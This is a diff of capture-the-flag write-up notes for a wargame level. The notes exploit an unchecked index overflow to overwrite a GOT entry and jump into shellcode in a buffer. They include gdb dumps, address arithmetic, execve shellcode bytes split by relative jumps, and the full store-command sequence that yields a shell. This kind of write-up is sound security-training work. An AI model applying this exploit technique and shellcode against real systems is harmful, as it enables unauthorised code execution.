@@ -77,81 +77,66 @@ Program received signal SIGSEGV, Segmentation fault.
 buffer[1] = 0xffffd578 = 4294956408
 
 => We try it with a sigtrap
-Input command: store
- Number: 3435973836 (\xcc\xcc\xcc\xcc)
- Index: 1 (buffer[1])
+store:
+        number: 3435973836 (\xcc\xcc\xcc\xcc)
+        index:  1
 ...
-Input command: store
- Number: 4294956408 (buffer[1])
- Index: 33632932 (index * 4 to write to fflush@got.plt)
+store:
+ 	number: 4294956408 (buffer[1])
+ 	index: 33632932 (index * 4 to write to fflush@got.plt)
 ...
 Program received signal SIGTRAP, Trace/breakpoint trap.
 0xffffd579 in ?? ()
+
+
+=> But in the real environment addresses mismatch (the hell begin)
+
+/***********************************/
+	O U T S I D E    G D B 
+/***********************************/
+
+=> To found the good index we need to use the read command and play with it 
+
+(gdb) x 0x804a000
+0x804a000 <printf@got.plt>:	0xf7e78480
+(gdb) x 0x804a004
+0x804a004 <fflush@got.plt>:	0xf7e90880
+(gdb) x 0x804a008
+0x804a008 <getchar@got.plt>:	0xf7e94840
+(gdb) x 0x804a00c
+0x804a00c <fgets@got.plt>:	0xf7e90ba0
+
+index: 33632932 -> 134520616 -> 8049F28
+...
+index: 33632936 -> 4159244416 -> 0xf7e90880
+https://www.rapidtables.com/convert/number/decimal-to-hex.html?x=4159244416
+
+INDEX: 33632936 
+=> We have a difference of 4 bytes
+
+=> We need to calcul the begin of the buffer too 
+=> To do that we put a sigtrap at buffer[1] and play with the inital address found in gdb 4294956408
+...
+number: 4294956408
+...
+number: 4294956392 -> triggers the sigtrap 
+
+NUMBER buffer[1] = 4294956392
+
 
 
 /******************************************/
 	 S H E L L    C O D E 
 /******************************************/
 
-
 => Now that we can redirect the execution to buffer[1] we will write a shell code in that buffer
 => We have a problem that we can't write more that 2 consecutive addresses because of the modulo 3
-=> So to resolve this problem we will slice our buffer with a jump every two adresses
-
-
-gdb 67 64 62
-env 65 6e 76
-
--2 +10 +20 
-
-= 28
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-store:
-        number: 55
-        index: 33632933 in gdb (!!! 33632936 in vm !!!)
-Program received signal SIGSEGV, Segmentation fault.
-0x00000037 in ?? ()
--> IT WORKS 
-
--> Try to redirect in a sigtrap in the buffer (buffer[0] = \xCC)
--> Found buffer[1] = 0xffffd578 (4294956408) in gdb (0xFFFFD568 in vm)
-store:
-	number:	3435973836 (\xcc\xcc\xcc\xcc)
-	index: 	1
-
-store:
-	number: 4294956408 (addr buffer[1])
-	index:  33632933 (overflow uint to got.plt entries)
-
-
--> Create payload:
-Contraints 2 * 4 bytes consecutives maximum because of modulo 3, 
-then we need to add relative jump to our payload
+=> So to resolve this problem we will slice our buffer with a jump every two adresses by adding a relative jump 
 \xEB\x04 jmp 4 bytes
 
-Exemple:
-0xffffd56c:	0xffffd7d8	0x00000000	0x00000000	0x90909090
-0xffffd57c:	0x04eb9090	0x00000000	0xcccccccc	0x00000000
+Example 
+0xffffd7d8	0x00000000	0x00000000	0x90909090
+0x04eb9090	0x00000000	0xcccccccc	0x00000000
 
 
 0:  31 c0                   xor    eax,eax
@@ -171,6 +156,8 @@ Little endian shell code + jumps
 
 \x90\x90\x90\x90  \x04\xeb\x90\x90
 2425393296	  82546832
+
+--------------------------------------
 
 \x31\xc0\x50\x90 \x90\x90\xEB\x04
 9050c031	 04eb9090
@@ -202,71 +189,70 @@ c189e389	 04ebc289
 8441152
    16
 
-/*******************************************************************/
-		F I N A L
-
-Input command: store
- Number: 3435973836
- Index: 1
- Completed store command successfully
-Input command: store
- Number: 4294956392
- Index: 33632936
- Completed store command successfully
-Input command: store
-Trace/breakpoint trap (core dumped)
 
 ***********************************************************************
-
+		F I N A L
 
 Input command: store
  Number: 2421211185
  Index: 1
  Completed store command successfully
+
 Input command: store
  Number: 82546832
  Index: 2
  Completed store command successfully
+
 Input command: store
  Number: 1932472168
  Index: 4
  Completed store command successfully
+
 Input command: store
  Number: 82546792
  Index: 5
  Completed store command successfully
+
 Input command: store
  Number: 1768042344
  Index: 7
  Completed store command successfully
+
 Input command: store
  Number: 82546798
  Index: 8
  Completed store command successfully
+
 Input command: store
  Number: 3247039369
  Index: 10
  Completed store command successfully
+
 Input command: store
  Number: 82559625
  Index: 11
  Completed store command successfully
+
 Input command: store
  Number: 2160921520
  Index: 13
  Completed store command successfully
+
 Input command: store
  Number: 82559025
  Index: 14
  Completed store command successfully
+
 Input command: store
  Number: 8441152
  Index: 16
  Completed store command successfully
+
 Input command: store
  Number: 4294956392
  Index: 33632936
  Completed store command successfully
+
 Input command: store
 $ whoami
 level08
